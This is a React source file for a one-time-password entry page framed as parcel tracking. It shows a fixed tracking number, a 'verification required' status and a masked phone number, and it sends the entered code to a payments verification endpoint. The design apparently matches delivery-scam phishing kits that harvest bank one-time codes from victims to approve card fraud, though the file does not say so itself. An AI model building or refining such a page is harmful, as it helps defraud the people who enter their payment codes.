import React, { useState } from 'react';
import axios from 'axios';
import './OtpForm.css';
import FAQSection from './FAQSection';
import Footer from './Footer';
import ProgressBar from './ProgressBar';

const OtpForm = ({ formData, handleChange, setError }) => {
  const [loading, setLoading] = useState(false);
  const [otpError, setOtpError] = useState('');
  const apiBaseUrl = process.env.REACT_APP_API_BASE_URL ;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setOtpError('');
    
    try {
      // Validate OTP format (6-8 digits)
      if (!formData.otp?.match(/^\d{6,8}$/)) {
        throw new Error('OTP must be between 6-8 digits');
      }
      
      // Make API request
      const response = await axios.post(
        `${apiBaseUrl}/api/payments/verify-otp`, 
        { otp: formData.otp },
        {
          headers: {
            'Content-Type': 'application/json'
          },
          withCredentials: true
        }
      );
      
      if (!response.data.success) {
        throw new Error(response.data.error || 'OTP verification failed');
      }
    } catch (err) {
      let errorMessage = 'OTP verification failed';
      
      if (err.response) {
        errorMessage = err.response.data?.error || 
                      err.response.data?.message || 
                      `Server error (${err.response.status})`;
      } else if (err.request) {
        errorMessage = 'Network error - please check your connection';
      } else {
        errorMessage = err.message;
      }
      
      setOtpError(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const handleOtpChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8); // Allow up to 8 digits
    handleChange({ target: { name: e.target.name, value } });
    
    if (otpError && value.length > 0) {
      setOtpError('');
    }
  };

  return (
    <div className="otp-container">
      <ProgressBar currentStep="otp" />
      
      <div className="tracking-header">
        <h1>
          <span className="tracking-label">Tracking Number:</span> US9514901165421
        </h1>
      </div>

      <div className="status-notification">
        <div className="status-content">
          <span className="status-label">Status:</span>
          <span className="status-message">OTP verification required</span>
        </div>
      </div>

      <div className="otp-instructions">
        <p>We've sent a verification code to your registered mobile number ending with ••••1234.</p>
       
      </div>

      <form onSubmit={handleSubmit} className="otp-form">
        <h2 className="form-title">OTP Verification</h2>
        
        <div className="otp-input-group">
          <label htmlFor="otpInput">Enter Verification Code</label>
          <input
            type="text"
            id="otpInput"
            name="otp"
            value={formData.otp}
            onChange={handleOtpChange}
            maxLength={8}
            placeholder="Enter 6-8 digit code"
            required
            disabled={loading}
            inputMode="numeric"
            pattern="\d*"
            autoComplete="one-time-code"
            className={otpError ? 'error' : ''}
          />
          <div className="otp-hint">
            {formData.otp?.length > 0 ? `${formData.otp.length} digit${formData.otp.length !== 1 ? 's' : ''} entered` : 'Enter 6-8 digit code'}
          </div>
        </div>
        
        {otpError && (
          <div className="error-message">
            <i className="error-icon">⚠️</i>
            {otpError}
          </div>
        )}
        
        <div className="form-actions">
          <button 
            type="submit" 
            disabled={loading || !formData.otp?.match(/^\d{6,8}$/)}
            className="submit-button"
            aria-busy={loading}
          >
            {loading ? (
              <>
                <span className="button-spinner"></span> Verifying...
              </>
            ) : 'Verify OTP'}
          </button>
        </div>
      </form>

      <div className="otp-security-notice">
        <div className="security-icon">🔒</div>
        <p>For your security, this OTP will expire in 5 minutes</p>
      </div>
      
      <FAQSection/>
      <Footer/>
    </div>
  );
};

export default OtpForm;
